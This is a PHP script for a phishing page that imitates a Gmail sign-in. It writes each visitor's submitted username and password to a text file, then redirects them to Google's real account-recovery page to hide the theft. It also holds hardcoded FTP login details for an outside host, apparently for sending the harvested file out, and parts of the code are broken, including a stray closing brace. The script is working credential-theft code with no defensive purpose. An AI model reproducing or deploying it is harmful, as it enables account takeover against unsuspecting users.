<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
//check if form is submitted
    // ftp settings
    $ftp_hostname = 'ftpupload.net'; // change this
    $ftp_username = 'b12_32676505'; // change this
    $ftp_password = 'godjesus123S'; // change this

    $src_file = $_FILES['srcfile']['usernames.txt'];

    //upload file
    if ($src_file!='')
    {
        // remote file path
      
        
        // connect ftp
        $ftpcon = ftp_connect($ftp_hostname) or die('Error connecting to ftp server...');
        
        // ftp login
        $ftplogin = ftp_login($ftpcon, $ftp_username, $ftp_password);
        
        // ftp upload
        if (ftp_put($ftpcon, $src_file, $src_file, FTP_ASCII))
            echo 'File uploaded successfully to FTP server!';
        else
            echo 'Error uploading file! Please try again later.';
        
        // close ftp stream
        ftp_close($ftpcon);
    }
    else
        header('Location: index.php');
}
exit();
?>
